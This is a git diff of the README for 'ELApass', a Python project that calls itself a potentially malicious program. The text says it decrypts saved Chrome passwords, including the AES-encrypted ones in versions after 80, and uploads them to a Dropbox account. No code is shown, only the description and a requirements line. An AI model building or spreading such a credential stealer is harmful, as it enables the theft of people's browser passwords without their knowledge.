@@ -1,6 +1,6 @@
 # ELApass
-potentially malicious program that steals passwords from all versions of chrome (including version > 80).
-then uploads them in a txt file to an encrypted dropbox
+PUBLIC FOR A LIMITED TIME: potentially malicious program that decrypts passwords from all versions of chrome including version > 80 (uses AES encryption) 
+then uploads them to an encrypted Dropbox
 
 ### Requirements
 of course you need python 3.* and a dropbox account
